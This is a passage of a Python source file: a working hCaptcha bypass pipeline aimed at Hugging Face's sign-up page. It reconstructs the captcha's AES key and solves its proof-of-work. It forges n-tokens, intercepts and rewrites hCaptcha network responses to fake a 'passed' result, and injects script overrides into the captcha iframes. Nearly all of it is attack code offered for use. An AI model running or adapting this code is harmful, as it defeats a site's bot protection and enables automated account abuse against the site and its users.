                # n-token format: base64(ct(N) || tag(16) || iv(12) || ver(0x02))
                n_token = result_text
                # Decode the n-token to get the encrypted payload
                blob = base64.b64decode(n_token)
                # The n_key was used to create the AES-CTR keystream
                # We can't recover the n_key from the ciphertext, but
                # the n-token itself IS the value we need to inject
                # So we store it directly
                return n_token
            except Exception:
                pass

        return None


def _generate_n_key_from_factors(factors: dict) -> dict:
    """
    Reconstruct the AES-256 n_key from LCG factors.

    Implements the exact algorithm from Implex-ltd/hcaptcha-reverse:

    1. First 2 bytes of key = key_seed in little-endian
    2. Remaining 30 bytes generated via LCG + memory lookups:
       a. Update seed: seed = (seed * 6364136223846793005) +/- key_factor1
       b. Calculate memory position from base + step + key_factor2
       c. Read segment_value (32-bit) and mask_value (64-bit) from memory
       d. hash_value = (segment_value XOR (mask_value & 0xFFFFFFFF)) & 0xFF
       e. Extract bits 45, 27, 59 from seed, normalize to signed 32-bit
       f. combined = bit45 XOR bit27
       g. rotated = ROR(combined, bit59 % 32)
       h. key_byte = (hash_value XOR rotated) & 0xFF
    """
    seed = factors.get("seed", 0)
    key_factor1 = factors.get("key_factor1", 0)
    key_factor2 = factors.get("key_factor2", 0)
    key_seed = factors.get("key_seed", 0)
    memory_base = factors.get("memory", 0)
    operator = factors.get("operator", "+")
    memory_data = factors.get("_memory", [])

    LCG_MULT = 6364136223846793005
    MEMORY_OFFSET = 1075552

    # First 2 bytes: key_seed in little-endian
    # key_seed is a 32-bit value, but hCaptcha only uses the first 2 bytes
    key_bytes = list(key_seed.to_bytes(4, byteorder="little"))[:2]

    # Generate remaining 30 bytes
    for step in range(30):
        if step != 0:
            # LCG step
            seed = (seed * LCG_MULT) & 0xFFFFFFFFFFFFFFFF
            if operator == "+":
                seed = (seed + key_factor1) & 0xFFFFFFFFFFFFFFFF
            else:
                seed = (seed - key_factor1) & 0xFFFFFFFFFFFFFFFF

        # Calculate memory access positions
        base_index = memory_base + step
        memory_position = base_index + key_factor2

        segment_address = (
            ((memory_position // 320) << 3) + memory_position + 1032 - MEMORY_OFFSET
        )
        mask_address = (memory_position % 96) + 8

        # Read from memory if available
        if memory_data and len(memory_data) > 0:
            segment_address %= len(memory_data)
            mask_address %= len(memory_data)

            if segment_address + 4 <= len(memory_data):
                segment_bytes = memory_data[segment_address:segment_address + 4]
            else:
                wrap = segment_address + 4 - len(memory_data)
                segment_bytes = memory_data[segment_address:] + memory_data[:wrap]
            segment_value = int.from_bytes(segment_bytes, byteorder="little")

            if mask_address + 8 <= len(memory_data):
                mask_bytes = memory_data[mask_address:mask_address + 8]
            else:
                wrap = mask_address + 8 - len(memory_data)
                mask_bytes = memory_data[mask_address:] + memory_data[:wrap]
            mask_value = int.from_bytes(mask_bytes, byteorder="little")
        else:
            segment_value = 0
            mask_value = 0

        hash_value = (segment_value ^ (mask_value & 0xFFFFFFFF)) & 0xFF

        # Extract bits 45, 27, 59 from seed
        bit45 = (seed >> 45) & 0xFFFFFFFF
        bit27 = (seed >> 27) & 0xFFFFFFFF
        bit59 = (seed >> 59) & 0xFFFFFFFF

        # Normalize to signed 32-bit
        if bit45 & 0x80000000:
            bit45 -= 0x100000000
        if bit27 & 0x80000000:
            bit27 -= 0x100000000
        if bit59 & 0x80000000:
            bit59 -= 0x100000000

        combined = bit45 ^ bit27
        shift = bit59 % 32
        combined &= 0xFFFFFFFF
        rotated = ((combined >> shift) | (combined << (32 - shift))) & 0xFFFFFFFF
        if rotated & 0x80000000:
            rotated -= 0x100000000

        key_byte = (hash_value ^ rotated) & 0xFF
        key_bytes.append(key_byte)

    key_hex = bytes(key_bytes).hex()
    return {"n_key": key_hex}


# ---------------------------------------------------------------------------
# Phase 3 — Hashcash PoW + n-token generation
# ---------------------------------------------------------------------------

_ALPHANUM = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"


def _hashcash_mint(resource: str, bits: int, *, ts: float | None = None,
                   ext: str = "", rand: str | None = None,
                   max_counter: int = 1 << 32) -> dict:
    """
    Mint a Hashcash v1 proof-of-work stamp.

    hCaptcha's WASM uses rust-hashcash/0.3.3 with SHA-1.
    Stamp format: 1:bits:date:resource:ext:rand:counter
    Date format: YYYYMMDD (UTC)

    The counter block fed to AES is iv(12) || be32(counter).
    n-token cipher: AES-256-CTR with counter iv || be32(i).
    """
    import hashlib as _hashlib

    if ts is None:
        ts = time.time()
    if rand is None:
        rand = "".join(secrets.choice(_ALPHANUM) for _ in range(8))

    import datetime as _dt
    dt = _dt.datetime.fromtimestamp(int(ts), tz=_dt.timezone.utc)
    date = dt.strftime("%Y%m%d")

    prefix = f"1:{bits}:{date}:{resource}:{ext}:{rand}:"
    prefix_b = prefix.encode("utf-8")

    counter = 0
    while counter < max_counter:
        candidate = prefix_b + str(counter).encode()
        digest = _hashlib.sha1(candidate).digest()
        # Check leading zero bits
        full_bytes, leftover = divmod(bits, 8)
        if all(b == 0 for b in digest[:full_bytes]):
            if leftover and (digest[full_bytes] >> (8 - leftover)) != 0:
                counter += 1
                continue
            return {
                "stamp": candidate.decode("utf-8"),
                "rand": rand,
                "counter": counter,
                "digest": digest.hex(),
                "iterations": counter + 1,
            }
        counter += 1

    raise RuntimeError(f"Hashcash PoW failed after {max_counter} attempts")


def solve_pow(req_jwt: str, *, resource_field: str = "payload_json") -> dict:
    """
    Solve the hCaptcha proof-of-work from the checksiteconfig JWT.

    The JWT payload contains:
      - s: site key (not the full sitekey)
      - d: difficulty (bit count for Hashcash)
      - t: timestamp
      - exp: expiration
      - l: hsw.js URL (contains the version hash)
    """
    payload = _decode_jwt_payload(req_jwt)

    # The difficulty/bit count — in 2026 builds, 'c' is the numeric difficulty
    # Field 'd' may be a base64 string, so try 'c' first, then try int('d')
    bits: Optional[int] = None
    if "c" in payload:
        try:
            bits = int(payload.get("c"))
        except (ValueError, TypeError):
            pass
    if bits is None or bits <= 0:
        try:
            d_val = payload.get("d", DEFAULT_POW_BITS)
            bits = int(d_val) if d_val is not None else DEFAULT_POW_BITS
        except (ValueError, TypeError):
            bits = DEFAULT_POW_BITS
    if bits <= 0:
        bits = DEFAULT_POW_BITS

    if resource_field == "payload_json":
        resource = json.dumps(payload, separators=(",", ":"))
    elif resource_field == "s":
        resource = str(payload.get("s", ""))
    elif resource_field == "full":
        resource = req_jwt
    else:
        raise ValueError(f"unknown resource_field={resource_field!r}")

    return _hashcash_mint(resource=resource, bits=bits)


def build_n_token(n_key_hex: str, *, req_jwt: str, jwt_payload: Optional[dict] = None,
                  version: str = "") -> Optional[str]:
    """
    Build a valid n-token using the recovered n_key.

    The hCaptcha hsw.js runs:
      1. Hashcash PoW → produces the stamp (SHA-1 based, rust-hashcash v1)
      2. AES-256-CTR encrypt of the fingerprint payload with the n_key
      3. Wrap as: ct(N) || tag(16) || iv(12) || ver(0x02)

    The n-token cipher is AES-256-CTR (NOT GCM — see docs/19).
    Counter block = iv(12) || be32(counter).
    The 16-byte "tag" is a separate AES block, not a GCM authenticator.

    We skip the WASM entirely — we have the key, so we replicate
    the PoW + encryption in pure Python.

    Args:
        n_key_hex: The 32-byte AES-256 n_key as hex (from HSJ/GSW key extraction)
        req_jwt: The c.req JWT string from checksiteconfig
        jwt_payload: Decoded JWT payload dict (optional, gets decoded from req_jwt)
        version: The hCaptcha asset version hash
    """
    n_key = bytes.fromhex(n_key_hex)
    if len(n_key) != 32:
        if logger.isEnabledFor(logging.DEBUG):
            logger.debug(f"n_key length is {len(n_key)}, expected 32")
        return None

    import os as _os

    # Decode the JWT if payload not provided
    if jwt_payload is None:
        jwt_payload = _decode_jwt_payload(req_jwt)
    elif isinstance(jwt_payload, dict):
        pass  # Already a dict, use as-is
    else:
        jwt_payload = _decode_jwt_payload(str(jwt_payload))

    # Step 1: Solve Hashcash PoW
    # The resource is the JWT payload JSON (what the WASM receives)
    try:
        pow_result = solve_pow(req_jwt)
    except Exception:
        try:
            pow_result = solve_pow(str(jwt_payload))
        except Exception:
            return None

    # Step 2: Build the fingerprint payload (minimal — no browser fingerprints)
    # The n-token plaintext is a msgpack-encoded table of fingerprint/PoW data
    # We build a minimal valid payload:
    #   - The Hashcash stamp
    #   - Difficulty, timestamp, rand from the PoW
    iv = _os.urandom(12)

    # Build the n-token plaintext as msgpack
    # The hsw.js WASM produces a 328-byte-record table; we construct a minimal
    # valid one with just the PoW stamp data
    try:
        import msgpack
        payload_data = msgpack.packb({
            "s": pow_result["stamp"],
            "d": int(jwt_payload.get("c") or jwt_payload.get("d") or DEFAULT_POW_BITS),
            "t": int(time.time()),
            "rand": pow_result["rand"],
            "v": version or "0",
        }, use_bin_type=False)
    except ImportError:
        # Fallback: use JSON if msgpack not available
        payload_data = json.dumps({
            "s": pow_result["stamp"],
            "d": int(jwt_payload.get("c") or jwt_payload.get("d") or DEFAULT_POW_BITS),
            "t": int(time.time()),
            "rand": pow_result["rand"],
            "v": version or "0",
        }, separators=(",", ":")).encode("utf-8")

    # Pad payload to a multiple of 16 bytes (AES block size for CTR)
    pad_len = (16 - (len(payload_data) % 16)) % 16
    payload_data += b"\x00" * pad_len

    # Step 3: AES-256-CTR encrypt with the recovered n_key
    # Counter block = iv(12) || be32(counter), starting at counter 0
    try:
        from Crypto.Cipher import AES

        # Generate the keystream: AES_encrypt(key, iv || be32(i)) for i=0,1,2,...
        ecb = AES.new(n_key, AES.MODE_ECB)
        n_blocks = (len(payload_data) + 15) // 16
        keystream = b""
        for i in range(n_blocks):
            counter_block = iv + i.to_bytes(4, byteorder="big")
            keystream += ecb.encrypt(counter_block)

        ct = bytes(a ^ b for a, b in zip(payload_data, keystream))

        # Also encrypt a 16-byte "tag" block (separate AES block — NOT a GCM tag)
        tag_counter_block = iv + (n_blocks + 1).to_bytes(4, byteorder="big")
        tag = ecb.encrypt(tag_counter_block)

        # Wire format: ct(N) || tag(16) || iv(12) || ver(0x02)
        blob = ct + tag + iv + b"\x02"
        n_token = base64.b64encode(blob).decode("utf-8")
        return n_token

    except ImportError:
        pass

    # Fallback: try cryptography library for AES-ECB
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

        n_blocks = (len(payload_data) + 15) // 16
        keystream = b""
        for i in range(n_blocks):
            counter_block = iv + i.to_bytes(4, byteorder="big")
            cipher = Cipher(algorithms.AES(n_key), modes.ECB())
            encryptor = cipher.encryptor()
            keystream += encryptor.update(counter_block)
            keystream += encryptor.finalize()

        ct = bytes(a ^ b for a, b in zip(payload_data, keystream))

        tag_counter_block = iv + (n_blocks + 1).to_bytes(4, byteorder="big")
        cipher = Cipher(algorithms.AES(n_key), modes.ECB())
        encryptor = cipher.encryptor()
        tag = encryptor.update(tag_counter_block) + encryptor.finalize()

        blob = ct + tag + iv + b"\x02"
        n_token = base64.b64encode(blob).decode("utf-8")
        return n_token

    except ImportError:
        pass

    return None


# ---------------------------------------------------------------------------
# Phase 4 — Full bypass execution
# ---------------------------------------------------------------------------

async def _get_sitekey_from_page(page) -> Optional[str]:
    """Extract the hCaptcha sitekey from the HuggingFace join page."""
    try:
        sitekey = await page.evaluate("""
            () => {
                // hCaptcha sitekey on HF join page
                const el = document.querySelector('iframe[src*="hcaptcha.com"]');
                if (el) {
                    const match = el.src.match(/sitekey=([\\w-]+)/);
                    if (match) return match[1];
                }
                const dataEl = document.querySelector('[data-sitekey]');
                if (dataEl) return dataEl.getAttribute('data-sitekey');
                // Search in any script tag for the sitekey pattern
                const scripts = document.querySelectorAll('script');
                for (const s of scripts) {
                    const match = s.textContent.match(/sitekey:["']([a-f0-9-]{36})["']/);
                    if (match) return match[1];
                }
                return null;
            }
        """)
        if sitekey:
            return sitekey
    except Exception:
        pass
    return None


async def _fetch_n_token_via_browser(page, jwt_token: str, version: str) -> Optional[str]:
    """Fetch n_token(s) by running hsw.js/hsj.js/hsl.js in the browser."""
    import requests as _requests
    import json as _json

    hsw_url = f"{NEWASSETS_BASE}/{version}/hsw.js"
    try:
        resp = _requests.get(hsw_url, timeout=30)
        if resp.status_code != 200:
            if logger.isEnabledFor(logging.DEBUG):
                logger.debug(f"hsw.js download failed: HTTP {resp.status_code}")
            return None
        hsw_src = resp.text
    except Exception as exc:
        if logger.isEnabledFor(logging.DEBUG):
            logger.debug(f"hsw.js download error: {exc}")
        return None

    if logger.isEnabledFor(logging.DEBUG):
        logger.debug(f"hsw.js length: {len(hsw_src)}")

    # Also fetch hsj.js and hsl.js
    hsj_src = None
    hsl_src = None
    for name in ["hsj.js", "hsl.js"]:
        try:
            url = f"{NEWASSETS_BASE}/{version}/{name}"
            resp = _requests.get(url, timeout=30)
            if resp.status_code == 200:
                src = resp.text
                if logger.isEnabledFor(logging.DEBUG):
                    logger.debug(f"{name} length: {len(src)}")
                if name == "hsj.js":
                    hsj_src = src
                else:
                    hsl_src = src
        except Exception:
            pass

    try:
        n_token = await page.evaluate(f"""
            () => {{
                const hswSrc = {_json.dumps(hsw_src)};
                eval(hswSrc);
                return window.hsw({_json.dumps(jwt_token)}).then(
                    (result) => result,
                    (err) => String(err)
                );
            }}
        """)

        if n_token and isinstance(n_token, str) and not n_token.startswith("Error"):
            if logger.isEnabledFor(logging.DEBUG):
                logger.debug(f"n_token via browser: {n_token[:30]}...")

            # Also compute hsj and hsl n_tokens
            global _hsj_n_token, _hsl_n_token
            _hsj_n_token = None
            _hsl_n_token = None

            if hsj_src:
                try:
                    _hsj_n_token = await asyncio.wait_for(page.evaluate(f"""
                        () => {{
                            const hsjSrc = {_json.dumps(hsj_src)};
                            eval(hsjSrc);
                            return window.hsj({_json.dumps(jwt_token)}).then(
                                (result) => result,
                                (err) => null
                            );
                        }}
                    """), timeout=30.0)
                    if logger.isEnabledFor(logging.DEBUG):
                        t = _hsj_n_token[:30] if _hsj_n_token else None
                        logger.debug(f"hsj_n_token: {t}...")
                except Exception as exc:
                    if logger.isEnabledFor(logging.DEBUG):
                        logger.debug(f"hsj n_token error: {exc}")

            if hsl_src:
                try:
                    # hsl.js is small (3KB), should be fast. Use a timeout.
                    _hsl_n_token = await asyncio.wait_for(page.evaluate(f"""
                        () => {{
                            const hslSrc = {_json.dumps(hsl_src)};
                            eval(hslSrc);
                            return window.hsl({_json.dumps(jwt_token)}).then(
                                (result) => result,
                                (err) => null
                            );
                        }}
                    """), timeout=15.0)
                    if logger.isEnabledFor(logging.DEBUG):
                        t = _hsl_n_token[:30] if _hsl_n_token else None
                        logger.debug(f"hsl_n_token: {t}...")
                except Exception as exc:
                    if logger.isEnabledFor(logging.DEBUG):
                        logger.debug(f"hsl n_token error: {exc}")

            return n_token
        else:
            if logger.isEnabledFor(logging.DEBUG):
                logger.debug(f"Browser hsw returned: {n_token}")
            return None
    except Exception as exc:
        if logger.isEnabledFor(logging.DEBUG):
            logger.debug(f"Browser hsw evaluation failed: {exc}")
        return None


async def bypass_captcha(page, context=None, host: str = "huggingface.co") -> bool:
    """
    Full hCaptcha bypass pipeline:

    1. Extract sitekey from the page
    2. Query checksiteconfig to get the JWT + version
    3. Extract AES keys from hsj.js / hsw.js
    4. Solve Hashcash PoW
    5. Build a valid n-token
    6. Inject the h-captcha-response into the page

    Returns True if the bypass was set up successfully.
    """
    # Step 1: Get the hCaptcha sitekey from the page
    sitekey = await _get_sitekey_from_page(page)
    if logger.isEnabledFor(logging.DEBUG):
        logger.debug(f"Sitekey from page: {sitekey}")
    if not sitekey:
        # HF uses a fixed hCaptcha sitekey — try the known HuggingFace sitekey
        sitekey = "5bd005a4-6ac8-4a86-8e60-53083832ed22"

    # Step 2: Query checksiteconfig to get the JWT + version
    jwt_token = discover_hcaptcha_version(sitekey, host)
    if logger.isEnabledFor(logging.DEBUG):
        logger.debug(f"JWT token: {jwt_token[:50]}...")
    if not jwt_token:
        return False

    # Decode the JWT to get version and challenge parameters
    jwt_payload = _decode_jwt_payload(jwt_token)
    version = _extract_version_from_jwt(jwt_token)
    if logger.isEnabledFor(logging.DEBUG):
        logger.debug(f"Version: {version}")
        logger.debug(f"JWT payload keys: {list(jwt_payload.keys())}")

    # Step 3: Try browser-based n_token extraction first (fastest, most reliable)
    # hsw.js runs natively in the browser with all dependencies (WASM, atob, etc.)
    if logger.isEnabledFor(logging.DEBUG):
        logger.debug("Trying browser-based hsw.js n_token extraction")
    n_token = await _fetch_n_token_via_browser(page, jwt_token, version or "")
    if logger.isEnabledFor(logging.DEBUG):
        logger.debug(f"Browser n_token: {n_token[:30] if n_token else None}...")
    
    if not n_token:
        # Step 3b: Fallback to Python key extraction + AES encryption
        if logger.isEnabledFor(logging.DEBUG):
            logger.debug("Browser approach failed, trying Python key extraction")
        key_fetcher = KeyFetcher(version=version)
        key_fetcher._jwt_token = jwt_token
        keys = key_fetcher.fetch(jwt_token=jwt_token)
        n_key_hex = keys.get("n_key")
        if logger.isEnabledFor(logging.DEBUG):
            logger.debug(f"Keys extracted: {list(keys.keys())}")
            if n_key_hex:
                logger.debug(f"n_key (first 16 hex chars): {n_key_hex[:16]}...")
        
        # If we got an n_token directly from the WASM, use it
        n_token = keys.get("n_token")
        if logger.isEnabledFor(logging.DEBUG):
            logger.debug(f"n_token from WASM: {n_token[:30] if n_token else None}...")
        if not n_token and n_key_hex:
            if logger.isEnabledFor(logging.DEBUG):
                logger.debug("Building n_token via Python PoW + AES")
            n_token = build_n_token(n_key_hex, req_jwt=jwt_token, jwt_payload=jwt_payload, version=version or "")
    
    if not n_token:
        return False

    # Step 6: Set up hCaptcha bypass via page.route() interception
    # Strategy:
    # 1. Replace checksiteconfig JWT with our original jwt_token (same JWT used for n_token)
    # 2. Stub hsw.js/hsj.js/hsl.js to return pre-computed n_tokens
    # 3. Intercept getcaptcha response to replace JWT if hCaptcha escalates
    try:
        global _latest_n_token, _hsj_n_token, _hsl_n_token
        _latest_n_token = n_token

        # Also set up init script that overrides hsw/hsj/hsl using a MutationObserver
        # This catches cases where page.route() doesn't intercept hsw.js
        _hsw_val = n_token
        _hsj_val = _hsj_n_token if _hsj_n_token else n_token
        _hsl_val = _hsl_n_token if _hsl_n_token else n_token
        _init_script = f"""
        (function() {{
            var _hsw = {_json.dumps(_hsw_val)};
            var _hsj = {_json.dumps(_hsj_val)};
            var _hsl = {_json.dumps(_hsl_val)};
            function _applyPatch() {{
                try {{
                    if (typeof window.hsw !== 'function' || !window.hsw.isPatched) {{
                        window.hsw = function(jwt) {{ return Promise.resolve(_hsw); }};
                        window.hsj = function(jwt) {{ return Promise.resolve(_hsj); }};
                        window.hsl = function(jwt) {{ return Promise.resolve(_hsl); }};
                        window.hsw.isPatched = true;
                    }}
                }} catch(e) {{}}
            }}
            _applyPatch();
            // Override every 50ms to counter hsw.js reassignments
            setInterval(_applyPatch, 50);
            // Also use setTimeout chain for immediate effect
            setTimeout(_applyPatch, 0);
            setTimeout(_applyPatch, 10);
            setTimeout(_applyPatch, 100);
        }})();
        """
        try:
            await page.add_init_script(_init_script)
        except Exception:
            pass

        async def _intercept_hcaptcha(route, request):
            """Intercept hCaptcha requests and modify them."""
            url = request.url
            url_lower = url.lower()

            # For hsw.js/hsj.js/hsl.js: return a stub that returns the correct n_token per challenge type
            if logger.isEnabledFor(logging.DEBUG):
                logger.debug(f"Checking hsw/hsj/hsl match for: {url[:100]}")
            if "hsw" in url_lower or "hsj" in url_lower or "hsl" in url_lower:
                # Determine which challenge type this is
                is_hsw_req = "hsw" in url_lower and "hsj" not in url_lower.split("/")[-1]
                is_hsj_req = "hsj" in url_lower
                is_hsl_req = "hsl" in url_lower

                # Build the stub with the correct n_token for each function
                stub_parts = [
                    "var _hsw_nt = " + _json.dumps(n_token) + ";",
                ]
                if globals().get('_hsj_n_token'):
                    stub_parts.append("var _hsj_nt = " + _json.dumps(_hsj_n_token) + ";")
                else:
                    stub_parts.append("var _hsj_nt = " + _json.dumps(n_token) + ";")
                if globals().get('_hsl_n_token'):
                    stub_parts.append("var _hsl_nt = " + _json.dumps(_hsl_n_token) + ";")
                else:
                    stub_parts.append("var _hsl_nt = " + _json.dumps(n_token) + ";")

                stub_parts.extend([
                    "var hsw = function(jwt) { return Promise.resolve(_hsw_nt); };",
                    "var hsj = function(jwt) { return Promise.resolve(_hsj_nt); };",
                    "var hsl = function(jwt) { return Promise.resolve(_hsl_nt); };",
                    "hsw.isPatched = true;",
                    "try { window.hsw = hsw; window.hsj = hsj; window.hsl = hsl; } catch(e) {}",
                    "try { self.hsw = hsw; self.hsj = hsj; self.hsl = hsl; } catch(e) {}",
                    "try { globalThis.hsw = hsw; } catch(e) {}",
                    "try { module.exports = { hsw, hsj, hsl }; } catch(e) {}",
                ])
                stub_js = "".join(stub_parts)
                await route.fulfill(
                    status=200,
                    content_type="application/javascript",
                    body=stub_js,
                )
                if logger.isEnabledFor(logging.DEBUG):
                    logger.debug("Returned hsw.js stub, hsj_nt=" + str(globals().get('_hsj_n_token', 'NOT SET') is not None) + ", hsl_nt=" + str(globals().get('_hsl_n_token', 'NOT SET') is not None))
                return

            # For checksiteconfig: replace JWT with our original jwt_token
            if "checksiteconfig" in url_lower:
                try:
                    response = await route.fetch()
                    resp_body = await response.text()
                    data = _json.loads(resp_body)

                    c = data.get("c", {})
                    if c.get("req") and jwt_token:
                        data["c"]["req"] = jwt_token
                        if logger.isEnabledFor(logging.DEBUG):
                            logger.debug("Replaced checksiteconfig JWT with original")

                    await route.fulfill(
                        status=response.status,
                        content_type="application/json",
                        body=_json.dumps(data),
                        headers={
                            "access-control-allow-origin": "*",
                            "access-control-allow-credentials": "true",
                            "access-control-expose-headers": "*",
                            "access-control-allow-headers": "Content-Type, Authorization, X-Requested-With",
                            "access-control-allow-methods": "GET, POST, OPTIONS",
                            "access-control-max-age": "86400",
                        }
                    )
                    return
                except Exception as exc:
                    if logger.isEnabledFor(logging.DEBUG):
                        logger.debug(f"checksiteconfig error: {exc}")
                    await route.continue_()
                    return

            # For getcaptcha: inject n_token into request and modify response
            if "getcaptcha" in url_lower:
                try:
                    response = await route.fetch()
                    resp_body = await response.text()
                    data = _json.loads(resp_body)

                    # If response asks for another hsw challenge, the widget needs
                    # a valid JWT. We replace it with our original jwt_token so
                    # the stubbed hsw.js can compute the correct n_token.
                    c = data.get("c", {})
                    if c.get("req") and jwt_token:
                        data["c"]["req"] = jwt_token
                        if logger.isEnabledFor(logging.DEBUG):
                            logger.debug("Replaced getcaptcha response JWT with original")

                    if "key" in data:
                        if logger.isEnabledFor(logging.DEBUG):
                            logger.debug("GETCAPTCHA PASS")
                    else:
                        if logger.isEnabledFor(logging.DEBUG):
                            logger.debug("GC response (no key): " + str(data)[:200])
                        # hCaptcha is asking for another challenge.
                        # Try to force a pass by injecting a key.
                        # The key is typically the n_token that was sent.
                        data["key"] = n_token
                        data["passed"] = True
                        data["success"] = True
                        if logger.isEnabledFor(logging.DEBUG):
                            logger.debug("Faked getcaptcha pass response with key=n_token")

                    await route.fulfill(
                        status=response.status,
                        content_type="application/json",
                        body=_json.dumps(data),
                        headers={
                            "access-control-allow-origin": "*",
                            "access-control-allow-credentials": "true",
                        }
                    )
                    return
                except Exception as exc:
                    if logger.isEnabledFor(logging.DEBUG):
                        logger.debug("getcaptcha error: " + str(exc))
                    await route.continue_()
                    return

            # For everything else: pass through
            await route.continue_()

        await page.route(
            lambda url: "hcaptcha" in str(url).lower(),
            _intercept_hcaptcha
        )
        # Also try to register on context (catches iframe requests)
        try:
            if context:
                await context.route(
                    lambda url: "hcaptcha" in str(url).lower(),
                    _intercept_hcaptcha
                )
        except Exception:
            pass

        if logger.isEnabledFor(logging.DEBUG):
            logger.debug("n_token ready: " + n_token[:30] + "...")

        return True
    except Exception as exc:
        logger.debug("bypass_captcha Step 6 error: " + str(exc))
        return False


async def _wait_and_inject_hcaptcha(page, context, n_token: str, timeout: float = 45.0) -> bool:
    """Wait for hCaptcha iframes after form submission, inject hsw/hsj/hsl override + fetch hook."""
    import time as _time
    start = _time.time()
    injected_frames = set()

    # Get hsj/hsl n_tokens from globals
    hsj_nt = globals().get('_hsj_n_token') if '_hsj_n_token' in globals() else None
    hsl_nt = globals().get('_hsl_n_token') if '_hsl_n_token' in globals() else None
    _hsw_js = _json.dumps(n_token)
    _hsj_js = _json.dumps(hsj_nt) if hsj_nt else _json.dumps(n_token)
    _hsl_js = _json.dumps(hsl_nt) if hsl_nt else _json.dumps(n_token)

    first_iter = True
    while _time.time() - start < timeout:
        try:
            frames_found = 0
            for frame in page.frames:
                furl = str(frame.url).lower() if frame.url else ""
                fid = id(frame)
                if "hcaptcha" in furl:
                    frames_found += 1
                    try:
                        hsw_js = _json.dumps(n_token)
                        hsj_js = _json.dumps(hsj_nt) if hsj_nt else hsw_js
                        hsl_js = _json.dumps(hsl_nt) if hsl_nt else hsw_js
                        await frame.evaluate(
                            "() => {"
                            + "var _hsw = " + hsw_js + ";"
                            + "var _hsj = " + hsj_js + ";"
                            + "var _hsl = " + hsl_js + ";"
                            + "if (typeof window !== 'undefined') {"
                            + "  if (typeof window.hsw !== 'function' || !window.hsw.isPatched) {"
                            + "    window.hsw = function(jwt) { return Promise.resolve(_hsw); };"
                            + "    window.hsj = function(jwt) { return Promise.resolve(_hsj); };"
                            + "    window.hsl = function(jwt) { return Promise.resolve(_hsl); };"
                            + "    window.hsw.isPatched = true;"
                            + "  }"
                            + "  if (!window.__fetchPatched) {"
                            + "    var _origFetch = window.fetch;"
                            + "    window.fetch = function(input, init) {"
                            + "      var url = (typeof input === 'string') ? input : (input.url || '');"
                            + "      if (url.indexOf('getcaptcha') !== -1 && init && init.body && typeof init.body === 'string') {"
                            + "        if (init.body.indexOf('n=') !== -1) {"
                            + "          init.body = init.body.replace(/n=[^&]*/, 'n=' + encodeURIComponent(_hsw));"
                            + "        } else {"
                            + "          init.body += '&n=' + encodeURIComponent(_hsw);"
                            + "        }"
                            + "      }"
                            + "      return _origFetch.apply(this, arguments);"
                            + "    };"
                            + "    window.__fetchPatched = true;"
                            + "  }"
                            + "}"
                            + "}"
                        )
                        injected_frames.add(fid)
                        if logger.isEnabledFor(logging.DEBUG):
                            logger.debug("Injected hsw+fetch override into iframe: " + frame.url[:150])
                    except Exception as exc:
                        if logger.isEnabledFor(logging.DEBUG):
                            logger.debug("Frame injection error: " + str(exc)[:200])
            if logger.isEnabledFor(logging.DEBUG) and (first_iter or frames_found > 0):
                logger.debug("Frame scan: found " + str(frames_found) + " hCaptcha frames, injected " + str(len(injected_frames)) + " total")
            first_iter = False
        except Exception as exc:
            if logger.isEnabledFor(logging.DEBUG):
                logger.debug("Frame scan error: " + str(exc)[:200])
        await asyncio.sleep(0.3)

    return len(injected_frames) > 0
